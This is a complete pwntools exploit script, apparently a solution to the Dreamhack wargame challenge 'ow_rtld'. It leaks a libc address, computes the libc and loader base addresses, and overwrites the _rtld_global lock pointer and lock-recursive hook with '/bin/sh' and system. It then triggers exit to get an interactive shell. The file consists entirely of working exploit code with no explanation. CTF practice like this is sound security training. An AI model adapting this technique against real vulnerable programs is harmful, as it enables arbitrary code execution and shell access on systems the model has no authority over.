from pwn import *

p = remote("host1.dreamhack.games", 21237)
# p = process("./ow_rtld")
e = ELF("./ow_rtld")

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
lb = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

p.recvuntil(": ")
stdout_addr = int(p.recvn(14),16)
slog("stdout", stdout_addr)

libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
lb_base = libc_base + 0x3f1000
rtld_global = lb_base + lb.symbols["_rtld_global"]

_dl_load_lock_addr = rtld_global+2312
dl_rtld_lock_recursive_addr = rtld_global+3840
system_addr = libc_base + libc.symbols["system"]

binsh = u64("/bin/sh\x00")
slog("binsh", u64("/bin/sh\x00"))

p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(_dl_load_lock_addr))
p.sendlineafter(": ", str(binsh))

p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(dl_rtld_lock_recursive_addr))
p.sendlineafter(": ", str(system_addr))

p.sendlineafter("> ", "2")

p.interactive()